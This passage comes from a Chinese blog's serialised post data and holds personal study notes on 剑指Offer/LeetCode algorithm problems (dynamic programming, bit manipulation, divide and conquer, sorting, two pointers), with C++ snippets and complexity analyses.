max(dp[i], max(j dp[i - j], j (i - j))) 最小长度2，其初始值为1 * 1 = 1 从长度3开始，计算到长度n（第一个for） j是剪的长度，最少剪1，最多剪 i - 2，因为剪i - 1和剪1没区别（从此处可以想到一种优化） 123456dp[2] = 1;for(int i = 3; i &lt; n + 1; ++i)&#123; //n以内所有长度绳子的情况 for(int j = 1; j &lt; i - 1; ++j)&#123; //可选择剪的长度 dp[i] = max(dp[i], max(j * (i - j), j * dp[i - j])); &#125;&#125; 优化：剪k和剪i - k没区别，所以j最多剪到i的一半即可 第二个for改为 1for(int j = 1; j &lt;= i / 2; ++j) 复杂度1、数学方法直接计算出结果，时间复杂度O(1)，空间复杂度O(1) 2、时间复杂度O(n^2)，空间复杂度O(n) 易错点对dp还是不熟，dp首先要确定子问题是什么，建立和子问题的联系，分清多种情况。 剑指 Offer 57 - II. 和为s的连续正数序列输入一个正整数 target ，输出所有和为 target 的连续正整数序列（至少含有两个数）。 序列内的数字由小到大排列，不同序列按照首个数字从小到大排列。 输入：target = 9输出：[[2,3,4],[4,5]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、暴力枚举，从每个节点开始往后求累加，若超出target则从下一个节点开始 包含了重复计算，时间复杂度大 2、滑动窗口，设置一个左端点i，一个右端点j，向后滑动计算累和，有几种情况 （1）sum &lt; target，继续滑动，j+1 （2）sum &gt; target，已超过，说明从当前i开始不能找到所需序列，更换左端点，i+1 （3）sum = target，找到序列，加入res，并从下一个左端点开始继续查找 12345678910111213141516if(sum &lt; target)&#123; sum += j; ++j;&#125;else if(sum &gt; target)&#123; sum -= i; ++i;&#125;else&#123; vector&lt;int&gt; tmp; for(int k = i; k &lt; j; ++k) tmp.push_back(k); res.push_back(tmp); sum -= i; ++i;&#125; 滑动窗口方法只更换了i，j，没有重复计算中间的累加值。 复杂度一次遍历，时间复杂度O(target)，空间复杂度O(1) 易错点1、注意到一个性质：1~n-1的后半段一定不存在所求序列，因为target/2加上它后面的数一定比target大了，所有i移动到target/2即可 2、更换端点时sum记得减去当前的 i 或 j 剑指 Offer 62. 圆圈中最后剩下的数字0,1,···,n-1这n个数字排成一个圆圈，从数字0开始，每次从这个圆圈里删除第m个数字（删除后从下一个数字开始计数）。求出这个圆圈里剩下的最后一个数字。 例如，0、1、2、3、4这5个数字组成一个圆圈，从数字0开始每次删除第3个数字，则删除的前4个数字依次是2、0、4、1，因此最后剩下的数字是3。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、用数组模拟该过程，每次取出一个元素直到只剩最后一个，但对于大数容易超时 1234while(circle.size() &gt; 1)&#123; idx = (idx + m -1) % circle.size(); circle.erase(circle.begin() + idx);&#125; 2、推导公式f(n,m) = (m+f(n-1,m))%n，见lc题解 复杂度1、模拟：每次抽签数m次，抽n次，时间复杂度O(nm)，数组模拟，空间复杂度O(n) 2、时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 14- II. 剪绳子 II给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为 k[0],k[1]…k[m - 1] 。请问 k[0]k[1]…*k[m - 1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。 答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/jian-sheng-zi-ii-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解题目和剪绳子1一样，多了大数处理 若用dp，dp[i]依赖于dp[i - j]，当dp[i - j]取模后变小导致dp[i]的值出错，最终结果也会出错，也就是说在计算过程中取模会影响dp的迭代。 本题应该用贪心思想避免大小比较，可以证明每次剪3是最优解，于是尽可能地剪3： 12345while(n &gt; 4)&#123; res = res * 3 % 1000000007; n -= 3;&#125;return int(res * n % 1000000007); n&lt;4时剪成1和n-1，返回n-1，n=4时不进入while，返回res*n = 1*4 =4 （其实是2*2） 复杂度时间复杂度O(n)，空间复杂度O(1) 易错点为了防止溢出，res类型是long，最后return的结果要转化为int。 最后也要取余 剑指 Offer 43. 1～n 整数中 1 出现的次数输入一个整数 n ，求1～n这n个整数的十进制表示中1出现的次数。 输入：n = 13输出：6 例如，输入12，1～12这些整数中包含1 的数字有1、10、11和12，1一共出现了5次。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/1nzheng-shu-zhong-1chu-xian-de-ci-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、遍历每个数找1，超时 2、找规律，直接通过位数得出1的次数，分析如下 123456789101112131415161718author: dingxufacase 1: cur=0 2 3 0 4 千位和百位可以选00 01 02....22 十位可以取到1( 形如[00|01..|22]1[0-9] 都是&lt;2304 ) 个位可以选0-9 共有 23 * 10 中排列 当千位和百位取23,如果十位取1 那就是形如 231[0-9] &gt; 2304,所以当千位和百位取23，十位只能能取0，个位取0-4即 2300 2301 2302 2303 2304 但是2301不应该算进来，这个1是 单独 出现在个位的（而11，121,111这种可以被算多次） 即 23*10case 2: cur=1 2 3 1 4 千位和百位可以选00 01 02....22 十位可以取到1 个位可以选0-9 共有 23 * 10 中排列 当千位和百位取23,十位取1，个位可以去0-4 即 2310-2314共5个 即 23 *10 + 4 +1case 3: cur&gt;1 即2-9 2 3 2 4 千位和百位可以选00 01 02....22 十位可以取到1(形如 [00|01...|22]1[0-9] 都是&lt;2324) 个位可以选0-9 共有 23 * 10 中排列 当千位和百位取23,十位取1，个位可以去0-9 即 2310-2319共10个 （其中2311，被计算了两次，分别是从个位和十位分析得到的1次） 即 23 *10 + 10 123456789101112while(high != 0 || cur != 0)&#123; if(cur == 0) res += high * digit ; else if(cur == 1) res += high * digit + low + 1; else res += high * digit + digit; low += cur * digit; cur = high % 10; high /= 10; digit *= 10;&#125; 复杂度时间复杂度O(k)，k是n的位数，空间复杂度O(1) 剑指 Offer 44. 数字序列中某一位的数字数字以0123456789101112131415…的格式序列化到一个字符序列中。在这个序列中，第5位（从下标0开始计数）是5，第13位是1，第19位是4，等等。 请写一个函数，求任意第n位对应的数字。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/shu-zi-xu-lie-zhong-mou-yi-wei-de-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解赶时间没看太懂，以后再来…","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 位运算","date":"2022-05-07T07:27:47.000Z","path":"2022/05/07/剑指offer-位运算/","text":"位运算，包括15. 二进制中1的个数，65. 不用加减乘除做加法，56 - I. 数组中数字出现的次数，56 - II. 数组中数字出现的次数 II 剑指 Offer 15. 二进制中1的个数编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为 汉明重量）。 输入：n = 11 (控制台输入 00000000000000000000000000001011)输出：3 题解1、循环移位，遇到一个1就让计数器加1 123if(n &amp; 1 == 1) ++cnt;n &gt;&gt;= 1; 2、利用n&amp;(n-1)消去n的一个1，因为n-1让n从后往前第一个1变为0，和n&amp;之后能使该位变为0 12n &amp;= n - 1;++cnt; 复杂度1、时间复杂度O(k)，k是n的位数，空间复杂度O(1) 2、循环次数为n中1的位数次，最坏情况下全1，n=2^k-1，时间复杂度为O(logn)，空间复杂度O(1) 剑指 Offer 65. 不用加减乘除做加法写一个函数，求两个整数之和，要求在函数体内不得使用 “+”、“-”、“*”、“/” 四则运算符号。 示例: 输入: a = 1, b = 1输出: 2 提示： a, b 均可能是负数或 0结果不会溢出 32 位整数 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/bu-yong-jia-jian-cheng-chu-zuo-jia-fa-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解考虑计算机中加法器的实现，分为求各位和，以及加上进位两步 第一步直接异或，不考虑进位，之后用且&amp;求出进位。 无进位加法：a^b 求进位：(a&amp;b)&lt;&lt;1，左移是因为进位是和左边那一位相加的，故整体都需要左移一位 123int temp = a ^ b; //不带进位的和b = (unsigned int)(a &amp; b) &lt;&lt; 1; //一个进位a = temp; 用代码表示就是不断求和以及进位，直到进位为0。 复杂度时间复杂度O(1)，空间复杂度O(1) 剑指 Offer 56 - I. 数组中数字出现的次数一个整型数组 nums里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。 输入：nums = [1,2,10,4,1,4,3,3]输出：[2,10] 或 [10,2] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解受复杂度限制，排序等方法都用不了。 位运算有一个性质：相同的数异或结果为0，也就是说将nums中所有数异或，最终得到的结果是那两个不同的数的异或结果res1 ^ res2 利用异或结果来分组：为1的位表示两个数在这一位上是不同的，而相同的数在这一位当然是相同的。 根据这一位的0、1两种情况将nums的数分为两组，相同的数是一组的，不同的两个数分在两组，如： 0：6,6,2 1：1,1,5 再次利用相同数异或为0的性质，在组内异或就可以留下两个不同的数 1234567891011while((sum &amp; 1) == 0)&#123; //不同的位 ++idx; sum &gt;&gt;= 1;&#125;int res1 = 0, res2 = 0;for(int n :nums)&#123; if((n &gt;&gt; idx &amp; 1) == 1) //分组，组内异或 res1 ^= n; else res2 ^= n;&#125; while找到为1的位，for分组异或 复杂度如题目所说，时间复杂度O(n)，空间复杂度O(1) 易错点运算符的优先级：(sum &amp; 1) == 0不能去掉括号，因为==的优先级比&amp;更高。 剑指 Offer 56 - II. 数组中数字出现的次数 II在一个数组 nums 中除一个数字只出现一次之外，其他数字都出现了三次。请找出那个只出现一次的数字。 输入：nums = [9,1,7,9,7,9,7]输出：1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解三个相同数的异或不为0，不能利用之前的性质了。 依然考虑位的特点，一个数字出现3次，那么它二进制的每一位也出现3次，这些位出现的次数能被3整除，而对于只出现一次的数，它每一位只出现一次，对应的次数不能被3整除。 所有，可以用一个数组存储所有数每一位的值的累加，再判断哪些位置不能被3整除，那就是所求结果占有的位。 12345678910for(int n : nums)&#123; for(int i = 31; i &gt;= 0; --i)&#123; //统计每一位非0的个数 vec[i] += n &amp; 1; n &gt;&gt;= 1; &#125;&#125;for(int i = 0; i &lt; 32; ++i)&#123; if(vec[i] % 3 != 0) //不被3整除说明这一位是唯一的那个数的位 res += pow(2, 31 - i);&#125; 复杂度遍历一次nums，位操作常数级复杂度，故时间复杂度O(n)，vec大小为常数，空间复杂度O(1)","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 分治算法","date":"2022-05-06T09:50:07.000Z","path":"2022/05/06/剑指offer-分治算法/","text":"分治算法，包括07. 重建二叉树，16. 数值的整数次方，33. 二叉搜索树的后序遍历序列，17. 打印从1到最大的n位数，51. 数组中的逆序对 剑指 Offer 07. 重建二叉树输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。 假设输入的前序遍历和中序遍历的结果中都不含重复的数字。 Input: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]Output: [3,9,20,null,null,15,7] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解思路很简单，找一个前序节点，找到对应的中序节点，把中序序列分为左右两份，对左右两份递归地进行上述步骤。 难点在左右子树的边界划分，多看多记 1234567TreeNode* node = new TreeNode(preorder[pre_root]);int idx = map[preorder[pre_root]]; //前序首节点在中序节点的位置//左子树的根节点就是左子树前序的第一个节点，加1即可。左边界不变，右边界不能超过idxnode-&gt;left = build(pre_root + 1, in_left, idx - 1); //右子树的根节点就是右子树的前序的第一个节点，也就是当前根节点加上左子树的节点数目后加1//左子树的节点数目等于idx - in_left，左边界在idx右边，右边界不变node-&gt;right = build(pre_root + idx - in_left + 1, idx + 1, in_right); 复杂度时间复杂度O(n)，空间复杂度(n) 剑指 Offer 16. 数值的整数次方实现 pow(x, n)，即计算 x 的 n 次幂函数（即，xn）。不得使用库函数，同时不需要考虑大数问题。 输入：x = 2.00000, n = -2输出：0.25000解释：2-2 = 1/22 = 1/4 = 0.25 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、直接递归，超时 2、快速幂，思路看题解，求n次幂可以转化为求x的2幂次方，n为负数把n转正然后x倒过来就行了。 123456while(N &gt; 0)&#123; if(N &amp; 1 == 1) res *= x; x *= x; //x的2幂次方（x^2,x^4,x^8...） N &gt;&gt;= 1; //后移一位&#125; 复杂度每次都是2的幂次方，相当于二分了，时间复杂度O(logn) 空间复杂度O(1) 剑指 Offer 33. 二叉搜索树的后序遍历序列输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历结果。如果是则返回 true，否则返回 false。假设输入的数组的任意两个数字都互不相同。 ​ 5​ / \\ 2 6 / \\ 1 3示例 1： 输入: [1,6,3,2,5]输出: false示例 2： 输入: [1,3,2,6,5]输出: true 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-hou-xu-bian-li-xu-lie-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、有后序遍历规律，最后一个节点是根节点，然后前半部分是左子树，后半部分（从第一个大于根节点的数开始）是右子树，重点就是找到第一个大于根节点的数，然后就能划分左右子树递归解决了 用left和right表示左右边界，找到第一个大于根节点的数mid，划分（left, mid - 1）和（mid，right-1） 2、单调栈，右节点大于根节点，根据逆后序若a[i]&lt;a[i+1]则符合要求，入栈；若a[i]&gt;a[i+1]，a[i+1]是之前某个节点的左子节点，找到那个父节点，不断出栈直到找到栈中小于a[i+1]的数。 复杂度1、每次确定一个节点，每次都要遍历一遍，时间复杂度O(n^2)，空间复杂度O(n) 2、一次遍历，时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 17. 打印从1到最大的n位数输入数字 n，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。 示例 1: 输入: n = 1输出: [1,2,3,4,5,6,7,8,9] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解原意是要解决大数问题，防止溢出。 由于各种数据类型即使是double也有溢出的可能，对于大数要用字符串相加的方法处理，而不是数字相加。求1~999..就是求1~9长度为n的全排列。 12345678910if(x == len)&#123; res.push_back(cur); return;&#125;int start = x == 0 ? 1 : 0; //个位数从1开始，避免0开头for(int i = start; i &lt;= 9; ++i)&#123; cur.push_back(nums[i]); perm(x + 1, len); //下一位 cur.pop_back();&#125; 类似全排列的方法，每次从小到大加入一位数字，长度到达len时就结束递归。 复杂度时间复杂度O(10^n)，空间复杂度O(10^n) 剑指 Offer 51. 数组中的逆序对在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。 输入: [7,5,6,4]输出: 5 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/shu-zu-zhong-de-ni-xu-dui-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、两层for暴力解，超时 2、for包含了重复计算，如 3,2,1中2和3都和1组成逆序对，因此在一个有序数组中找逆序对是非常方便的。 考虑归并排序：A: 9, 12, 16 B: 8, 15, 7，在归并的过程中，选择8，而8在A数组的后面，故整个A数组都和8构成逆序对，同样，选择8,9,12后，选15时A剩下的16和15组成逆序对。 也就是说，每次选择右边数组的元素时，左边数组剩下的元素个数就是可以形成得逆序对的个数。 直接在归并排序的代码中加上逆序对的计数即可：res += mid - i + 1; 复杂度其实就是归并，时间复杂度O(nlogn)，空间复杂度O(n) 易错点归并中把数组nums复制到辅助数组中只复制当前区间的元素即可，即low~high 不要完整复制0~size，否则大量不必要的元素复制将导致超时 123for(int i = low; i &lt;= high; ++i)&#123; tmp[i] = nums[i];&#125;","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 排序","date":"2022-04-30T03:12:25.000Z","path":"2022/04/30/剑指offer-排序/","text":"排序，包括45. 把数组排成最小的数，61. 扑克牌中的顺子，40. 最小的k个数，41. 数据流中的中位数 剑指 Offer 45. 把数组排成最小的数输入一个非负整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。 输入: [3,30,34,5,9]输出: “3033459” 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ba-shu-zu-pai-cheng-zui-xiao-de-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解一开始想的是基数排序，按最高位排，但每个数位数不同，取最高位很麻烦 想实现从高位到低位的排序，直接用字符串即可。最高位相同时如何比较？ 比如10和1,由题意应该把10放前面，因为101&lt;110，于是就有比较的原则：a+b&lt;b+a，则a&lt;b，反之亦然。 可以直接用sort，算子cmp写为 1return a+b&lt;b+a; 或者用快排等方法，修改比较原则即可。 复杂度最快的排序方法，时间复杂度O(nlogn)，需要用一个字符串，空间复杂度O(n) 易错点之前一直忽略的一点：快排的前后顺序，为什么先从后往前比较？ 原因是选择的基准left是最左边的那个数，当i,j相遇时把i和left交换需要保证此位置一定小于基准的那个数。若从前往后，i会在比str[left]更大的位置停下，若交换不能保证小于基准数，只有从后往前，先找到一个比基准数小的数，再去找比基准大的数，这样才能保证i，j相遇时永远比基准值小。 剑指 Offer 61. 扑克牌中的顺子从若干副扑克牌中随机抽 5 张牌，判断是不是一个顺子，即这5张牌是不是连续的。2～10为数字本身，A为1，J为11，Q为12，K为13，而大、小王为 0 ，可以看成任意数字。A 不能视为 14。 输入: [0,0,1,2,5]输出: True 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/bu-ke-pai-zhong-de-shun-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解题目就是判断0的数目能否填补数列的空隙，使之成为一个有序数列。 首先有一个基本的判断：若出现重复元素（不是0），一定不能有序 有两种方法判断是否有重复： 1、用集合set，遍历数组，每次加入集合时判断是否重复，并且记录最大值和最小值，求出总空隙 2、先排序，用nums[i]和nums[i+1]判断是否重复，同时分别用num[i+1]-num[i]计算空隙（当然也能用记录最大最小值的方法） 12345678if(nums[i]==0)&#123; //统计0的数目 ++cnt; continue;&#125;else if(nums[i]==nums[i+1]) //有重复元素直接判负 return false;int gap=nums[i+1]-nums[i]-1; //计算需要填补的空隙cnt-=gap; 复杂度法一：一次遍历时间复杂度O(n)，用到集合，空间复杂度O(n) 法二：需要排序，时间复杂度O(nlogn)，空间复杂度O(1) 剑指 Offer 40. 最小的k个数输入整数数组 arr，找出其中最小的 k个数。例如，输入4、5、1、6、2、7、3、8这8个数字，则最小的4个数字是1、2、3、4。 输入：arr = [3,2,1], k = 2输出：[1,2] 或者 [2,1]链接：https://leetcode-cn.com/problems/zui-xiao-de-kge-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、暴力方法，排序后找前k个，费时，其实题目只用找前k个，无需处理所有数据，可以在原有排序算法的基础上改进。 2、堆排序，无需对所有数据建堆，只维护大小为k的大根堆即可，然后检查其余元素是否能插入堆（是否小于堆顶元素），最终选出的k个数就是最小的k个数 123456for(int i=k;i&lt;arr.size();++i)&#123; if(arr[i]&lt;res[0])&#123; swap(arr[i],res[0]); //读入更小的数，并调整堆 heapAdjust(res,k,0); &#125;&#125; 3、快排，无需完成排序，把数组划分为最小的前k个数和其他数即可。仍然进行左右交换，但不再递归地对左右两边快排，二是选择最小前k个元素在的那一边，节省时间。 1234if(i&gt;k) //第k+1个元素在左边的数列里 quickSort(arr,low,i-1,k); if(i&lt;k) //第k+1个元素在右边的数列里 quickSort(arr,i+1,high,k); 复杂度堆排：堆大小为k，每次插入复杂度为logk，n个数都要插入，时间复杂度O(nlogk)，空间复杂度O(k) 快排：每次划分检查次数为n、n/2、n/4…，求和，总时间复杂度为O(n)，空间复杂度O(logn) 剑指 Offer 41. 数据流中的中位数如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。 输入：[“MedianFinder”,”addNum”,”addNum”,”findMedian”,”addNum”,”findMedian”][[],[1],[2],[],[3],[]]输出：[null,null,null,1.50000,null,2.00000] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-ju-liu-zhong-de-zhong-wei-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、排序，取中位数。超时，不需要每插入一个元素就sort一次 2、找中位数，考虑把数据分为等量的两边，一边是小根堆，存放值较大的那部分，一边是大根堆，存放值较小的那部分。每次求中位数时考虑二者堆顶的元素即可，维护堆只需要logn的复杂度 具体做法如下： 我们希望元素个数为奇数时直接在小根堆顶找到中位数，元素个数为偶数时两个堆的堆顶平均值就是中位数。 为此需要维护小根堆大小-大根堆大小=0或1 插入元素时判断大小堆的大小（m，n） 若m=n，应该插入到小根堆，但不能直接插入，因为小根堆需要保存所有元素较大的那部分，先把num插入到大根堆，调整后取堆顶值放入小根堆，也就是说先用大根堆筛选一遍。 若m!=n，也就是小根堆更大，插入到大根堆，同样的也不能直接插入，先插入小根堆筛选一遍，再把堆顶元素插入大根堆。 12345if(max_heap.size() == min_heap.size())&#123; //小根堆+1 max_heap.push(num); min_heap.push(max_heap.top()); max_heap.pop();&#125; 复杂度插入O(1)，调整O(logn)，故时间复杂度O(logn) 空间复杂度O(1)","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 双指针","date":"2022-04-26T14:14:37.000Z","path":"2022/04/26/剑指offer-双指针/","text":"双指针，包括18. 删除链表的节点，22. 链表中倒数第k个节点，25. 合并两个排序的链表，52. 两个链表的第一个公共节点，21. 调整数组顺序使奇数位于偶数前面，57. 和为s的两个数字，58 - I. 翻转单词顺序 剑指 Offer 18. 删除链表的节点给定单向链表的头指针和一个要删除的节点的值，定义一个函数删除该节点。返回删除后的链表的头节点。 输入: head = [4,5,1,9], val = 5输出: [4,1,9]解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解删除分为几种情况： 1、空链表，返回nullptr 2、待删除的节点就是头节点，返回head-&gt;next 3、其他情况（包括待删除节点在结尾），用pre和cur指向前后两个节点，寻找val，用cur指向它，让后pre=pre-&gt;next即可删除cur 也可以直接用递归实现： 123456if(head==nullptr) return nullptr;if(head-&gt;val==val) return head-&gt;next;head-&gt;next=deleteNode(head-&gt;next,val); return head; 复杂度时间复杂度O(n)，空间复杂度O(1) 易错点注意特殊情况的处理，如删除头节点，无法进行两个指针的移动，直接返回head-&gt;next即可 还应该注意没查找到的情况： 若此时cur=nullptr，说明没找到，不执行任何语句，直接返回head， 若cur!=nullptr，说明找到了，这时才删除cur节点。 123456while(cur!=nullptr &amp;&amp; cur-&gt;val!=val)&#123; pre=pre-&gt;next; cur=cur-&gt;next; //找val的位置&#125;if(cur!=nullptr) pre-&gt;next=cur-&gt;next; 剑指 Offer 22. 链表中倒数第k个节点输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。 给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k = 2. 返回链表 4-&gt;5. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解一次遍历实现：倒数第k个也就是顺着走len-k个，怎么走len-k？可以让一个指针探路，先走k步，剩下的距离就是len-k了，这时两个指针同时走，第二个指针就走len-k了，也就是走到了第k个节点处。 复杂度一次遍历，时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 25. 合并两个排序的链表输入两个递增排序的链表，合并这两个链表并使新链表中的节点仍然是递增排序的。 输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/he-bing-liang-ge-pai-xu-de-lian-biao-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解归并的思想，比较两个链表节点，加入小的那个，后移，继续比较 可以创建一个哑节点用于指示合并后的链表。 如下，每次cur后接一个小节点，然后一起后移，最后把剩下的节点直接接到尾部 123456789101112if(l1-&gt;val&lt;=l2-&gt;val)&#123; cur-&gt;next=l1; cur=cur-&gt;next; l1=l1-&gt;next;&#125;else&#123; cur-&gt;next=l2; cur=cur-&gt;next; l2=l2-&gt;next;&#125;&#125;cur-&gt;next=l1==nullptr?l2:l1; 可以发现，合并链表一直在做一个相同的步骤，即每次取出一个较小的节点，对其余节点再进行mergeTwolist，所以我们也可以用递归实现 前两个if就是最后接入剩下链表的过程，后两个if就是一般的判断 1234567891011if(l1==nullptr) return l2;else if(l2==nullptr) return l1;else if(l1-&gt;val&lt;l2-&gt;val)&#123; l1-&gt;next=mergeTwoLists(l1-&gt;next,l2); return l1;&#125;else&#123; l2-&gt;next=mergeTwoLists(l1,l2-&gt;next) return l2; 复杂度时间复杂度O(n+m)，空间复杂度O(1)，若递归则空间复杂度O(n+m) 易错点用哑节点来接收节点会使整个过程简单很多，直接在l1和l2上操作的话要考虑断链问题，十分繁琐，有了专门接收的节点后只需要把节点加入然后后移即可。 剑指 Offer 52. 两个链表的第一个公共节点输入两个链表，找出它们的第一个公共节点。 输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3输出：Reference of the node with value = 8输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解遍历然后找到第一个相同节点即可，但问题是两个链表长短不同，未必对齐。 1、直观的解决方法是让长链表先走，走它们长度的差值，使两个链表对齐，再共同向后遍历，检查相同节点。 2、链表A长度为l1+c，链表B长度为l2+c，只需要让A走l2，B走l1就能补上长度差，具体的做法是A走到尽头后从B的表头重新开始，B走到尽头后从A的表头重新开始。第二趟时A，B都走了l1+l2+c，将在第一个公共节点处相遇。 1234while(curA!=curB)&#123; curA=curA==nullptr?headB:curA-&gt;next; curB=curB==nullptr?headA:curB-&gt;next;&#125; 复杂度法一：一次遍历，时间复杂度O(max(m,n))，空间复杂度O(1) 法二：两个链表都要走一遍，时间复杂度O(m+n)，空间复杂度O(1) 剑指 Offer 21. 调整数组顺序使奇数位于偶数前面输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有奇数在数组的前半部分，所有偶数在数组的后半部分。 输入：nums = [1,2,3,4]输出：[1,3,2,4]注：[3,1,2,4] 也是正确的答案之一。 题解双指针，一个从左到右找偶数，一个从右到左找奇数，找到后交换，直到两个指针相遇结束。 123456789if(nums[i]%2==0 &amp;&amp; nums[j]%2==1)&#123; //左边是偶数，右边是奇数，交换 swap(nums[i],nums[j]); ++i;--j; continue;&#125;if(nums[i]%2==1) //只有左边不满足交换条件 ++i;if(nums[j]%2==0) //只有右边不满足交换条件 --j; 复杂度时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 57. 和为s的两个数字输入一个递增排序的数组和一个数字s，在数组中查找两个数，使得它们的和正好是s。如果有多对数字的和等于s，则输出任意一对即可。 示例 1： 输入：nums = [2,7,11,15], target = 9输出：[2,7] 或者 [7,2] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解类似两数之和，可以用哈希表，但空间复杂度为O(n) 此题多了一个有序的条件，也可以二分法，时间复杂度O(nlogn) 但更简便的方法是双指针一次遍历，初始i指向最小的元素，j指向最大的元素 1、若nums[i]+nums[j]&gt;target，左边已经是最小的了，那只能把右边往下减了，令j-1； 2、若nums[i]+nums[j]&lt;target，相反，i+1 123456if(nums[i]+nums[j]==target) return &#123;nums[i],nums[j]&#125;;else if(nums[i]+nums[j]&lt;target) ++i;else --j; 复杂度双指针的时间复杂度为O(n)，空间复杂度O(1) 剑指 Offer 58 - I. 